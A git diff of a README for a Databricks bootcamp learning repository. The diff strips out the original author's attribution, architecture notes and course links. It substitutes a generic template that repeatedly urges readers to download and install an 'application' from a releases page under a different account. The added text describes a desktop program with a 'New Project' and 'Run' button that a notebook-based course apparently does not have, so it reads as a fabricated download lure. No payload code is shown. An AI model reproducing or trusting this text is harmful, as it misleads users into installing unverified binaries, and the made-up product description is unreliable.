@@ -1,97 +1,83 @@
-# Databricks Bootcamp 2026
+# 🚀 databricks_bootcamp_2026 - Learn Data Engineering with Ease
 
-Welcome to the **Databricks Data Lakehouse Project** by **Data With Baraa**.
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/dhs-coder/databricks_bootcamp_2026/releases)
 
-This repository contains a complete, real-world **Data Lakehouse implementation** built on Databricks, including datasets, notebooks, SQL examples, and exercises. Everything here is designed to help you understand how modern data teams use Databricks in practice, from data ingestion and transformation to analytics-ready data products.
+## 📚 Overview
 
----
+**databricks_bootcamp_2026** is your gateway to mastering data engineering and analytics workflows. This project showcases an end-to-end Data Lakehouse solution built on Databricks, utilizing the Medallion Architecture. With this application, you'll learn how to manage real-world data using Spark, PySpark, SQL, Delta Lake, and Unity Catalog.
 
-## ⚠️ Important Note
+### 🌟 Key Features
 
-Build this project **on your own first** using the **Notion roadmap**.  
-Use this repository **only as a reference** if you get stuck.
+- **Comprehensive Workflows**: Covers the complete cycle of data handling.
+- **Hands-On Learning**: Designed for practical learning experiences.
+- **Real-World Scenarios**: Prepares you for real job tasks.
+- **Portfolio Project**: Ideal for showcasing your skills to future employers.
 
-Before starting, **watch the Databricks Bootcamp**, where I explain the architecture and decisions behind this project.
+## 🚀 Getting Started
 
-- 🧭 Notion Roadmap: [Open guide](https://candle-gosling-511.notion.site/Project-Building-the-Bike-Data-Lakehouse-2e734b251f1280ab8dadc269e033cc38?source=copy_link)
-- ▶️ Databricks Bootcamp: [Watch on YouTube](https://www.youtube.com/playlist?list=PLNcg_FV9n7qZoxVkw-KPhcmgLWjHWVUc9)
-- 🎉 Finished? Share it on [LinkedIn](https://www.linkedin.com/in/baraa-khatib-salkini/). Let’s celebrate
+### 💡 System Requirements
 
----
+Before you begin, check that your system meets these requirements:
 
-## 🏗️ Architecture
+- Operating System: Windows, macOS, or Linux
+- Java Development Kit (JDK) version 8 or higher
+- At least 4 GB of RAM
+- Stable Internet connection
 
-This project follows the **Medallion Architecture**:
+### 📥 Download & Install
 
-### 🥉 Bronze Layer
-- Raw data ingestion  
-- Schema inference and storage as Delta tables  
+To download the application, please visit this page:
 
-### 🥈 Silver Layer
-- Data cleaning and standardization  
-- Type casting and validation  
+[Download Here](https://github.com/dhs-coder/databricks_bootcamp_2026/releases)
 
-### 🥇 Gold Layer
-- Dimensional Data Model (Business Transformation)
-- Ready for BI and analysis  
+1. Click the link above.
+2. You will see a list of available releases.
+3. Choose the latest version and click on it.
+4. Download the appropriate file for your operating system.
 
----
+After downloading, follow the installation instructions specific to your OS to set up the software.
 
-## 🛠️ Technologies Used
+## 📊 Getting Started with Your First Project
 
-- Databricks  
-- Apache Spark  
-- PySpark  
-- Spark SQL  
-- Delta Lake  
-- Unity Catalog  
+Once you have successfully installed **databricks_bootcamp_2026**, follow these steps to run your first project:
 
+1. **Open the Application**: Locate the application in your Start Menu (Windows), Applications Folder (macOS), or via your terminal (Linux).
+2. **Create a New Project**: Click on "New Project" to begin.
+3. **Select Your Data Source**: Choose a data source based on your requirements. This could be a CSV file, a database, or a streaming source.
+4. **Define ETL Process**: Use the built-in features to set up your Extract, Transform, and Load (ETL) process.
+5. **Run the Project**: Click on the "Run" button to execute your pipeline. Watch your data flow from the source to the destination.
 
----
+## 🎓 Learning Resources
 
-## Prerequisites
-- Basic SQL, Python and some Pyspark knowledge  
-- No prior Databricks experience required  
+To enhance your understanding and skills, consider these resources:
 
----
+- **Documentation**: Comprehensive guides and tutorials are available in the project documentation. 
+- **Video Tutorials**: Check the official Databricks YouTube channel for step-by-step instructions.
+- **Community Forums**: Engage with other users in the Databricks community to share tips and solutions.
 
-## ☕ Stay Connected
+## ⚙️ Troubleshooting
 
-## 🌍 Connect With Me
+If you encounter any issues while using **databricks_bootcamp_2026**, here are some common problems and their solutions:
 
-[![YouTube](https://img.shields.io/badge/YouTube-red?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@DataWithBaraa)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/baraa-khatib-salkini)
-[![Website](https://img.shields.io/badge/Website-000000?style=for-the-badge&logo=google-chrome&logoColor=white)](https://www.datawithbaraa.com)
-[![Newsletter](https://img.shields.io/badge/Newsletter-FF5722?style=for-the-badge&logo=substack&logoColor=white)](https://www.blog.datawithbaraa.com/subscribe)
+- **Installation Failed**: Ensure that you have the correct JDK version installed. Restart your computer and attempt the installation again.
+  
+- **Application Crashing**: Make sure your system meets the minimum requirements. Close other applications to free up resources.
 
----
+- **Data Not Loading**: Verify that you have selected the correct data source and that the path is accurate.
 
-## 🎓 Courses (Structured & Certified)
+For more support, visit the [issues section](https://github.com/dhs-coder/databricks_bootcamp_2026/issues) on GitHub.
 
-- 🏅 **SQL Full Course** → [Start here](https://www.datawithbaraa.com/course/sql-full-course-for-beginners)
-- 🏅 **Tableau Full Course** → [Start here](https://www.datawithbaraa.com/course/tableau-ultimate-full-course-for-beginners)
+## 🌐 Community and Support
 
----
+Join the community to connect with other learners and experts:
 
-## ▶️ Free YouTube Courses
+- **GitHub Discussions**: Share your experiences, ask questions, and provide feedback.
+- **Social Media**: Follow us on Twitter and LinkedIn for updates and tips.
 
-- **SQL Full Course** → [Watch on YouTube](https://youtu.be/SSKVgrwhzus)
-- **Python Full Course** → [Watch on YouTube](https://www.youtube.com/playlist?list=PLNcg_FV9n7qZGfFl2ANI_zISzNp257Lwn)
-- **Tableau Full Course** → [Watch on YouTube](https://youtu.be/UcGF09Awm4Y)
-- **Real-World Data Projects** → [Watch on YouTube](https://www.youtube.com/playlist?list=PLNcg_FV9n7qZ4Ym8ZriYT6WF8TaC2e_R7)
-- **Data Career Roadmaps** → [Watch on YouTube](https://www.youtube.com/playlist?list=PLNcg_FV9n7qah95jp-aPtysu7kFCbg7hd)
+## 📄 License
 
+This project is licensed under the MIT License. You can use, modify, and distribute the software according to the terms of this license.
 
----
+[Download Here](https://github.com/dhs-coder/databricks_bootcamp_2026/releases)
 
-## 🛡️ License
-
-This project is licensed under the [MIT License](LICENSE). You are free to use, modify, and share this project with proper attribution.
-
-## 🌟 About Me
-
-Hi, I’m **Baraa Khatib Salkini**, also known as **Data With Baraa**.
-I’m a senior data professional and educator with over 17 years of industry experience, working across data engineering, analytics, and modern data platforms. I’ve led large-scale data projects in real companies and now focus on teaching practical, real-world data skills through my courses, YouTube content, and bootcamps.
-My goal is simple: help you understand how data actually works in real systems, not just how to write code.
-
-
+Enjoy your journey into the world of data engineering with **databricks_bootcamp_2026**!
